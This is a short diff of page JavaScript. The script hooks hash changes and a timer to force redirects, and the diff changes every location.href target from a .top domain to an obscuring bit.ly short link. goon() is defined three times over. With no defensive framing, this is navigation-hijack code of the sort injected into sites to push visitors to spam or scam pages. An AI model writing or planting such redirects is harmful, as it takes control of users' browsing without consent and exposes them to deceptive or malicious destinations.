@@ -4,14 +4,14 @@ window.onhashchange=function(){jp();};
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://echifobi.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
     function goon(){
-        location.href="https://echifobi.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
 function goon(){
-        location.href="https://echifobi.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
 function goon(){
-        location.href="https://echifobi.top/4/9089389";
+        location.href="https://bit.ly/3W6qUJU";
     }
